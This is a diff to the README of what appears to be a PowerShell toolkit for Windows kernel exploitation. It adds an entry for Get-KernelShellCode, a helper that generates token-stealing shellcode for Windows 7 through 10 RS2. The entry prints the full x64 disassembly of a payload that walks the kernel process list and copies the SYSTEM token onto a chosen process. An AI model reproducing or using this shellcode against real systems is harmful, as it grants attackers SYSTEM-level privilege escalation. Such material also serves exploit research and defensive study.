@@ -122,6 +122,41 @@ bcdedit /dbgsettings SERIAL DEBUGPORT:1 BAUDRATE:115200
 
 ## Kernel Helper Functions
 
+### Get-KernelShellCode
+
+Generate x32/64 Kernel token stealing shellcode.
+
+Targets: 7, 8, 8.1, 10, 10 RS1, 10 RS2
+
+```
+# x64 Win10 RS2
+PS C:\Users\b33f> $sc = Get-KernelShellCode
+PS C:\Users\b33f> Get-CapstoneDisassembly -Architecture CS_ARCH_X86 -Mode CS_MODE_64 -Bytes $sc
+
+Address  Instruction
+-------  -----------
+0x100000 mov r9, qword ptr gs:[0x188]
+0x100009 mov r9, qword ptr [r9 + 0x220]
+0x100010 mov r8, 0x2dbc
+0x100017 mov rax, r9
+0x10001A mov rax, qword ptr [rax + 0x2e8]
+0x100021 sub rax, 0x2e8
+0x100027 cmp qword ptr [rax + 0x2e0], r8
+0x10002E jne 0x10001a
+0x100030 mov rcx, rax
+0x100033 add rcx, 0x358
+0x10003A mov rax, r9
+0x10003D mov rax, qword ptr [rax + 0x2e8]
+0x100044 sub rax, 0x2e8
+0x10004A cmp qword ptr [rax + 0x2e0], 4
+0x100052 jne 0x10003d
+0x100054 mov rdx, rax
+0x100057 add rdx, 0x358
+0x10005E mov rdx, qword ptr [rdx]
+0x100061 mov qword ptr [rcx], rdx
+0x100064 ret
+```
+
 ### Get-LoadedModules
 
 Gets the base of all loaded modules. For Low integrity this only works pre Win 8.1.
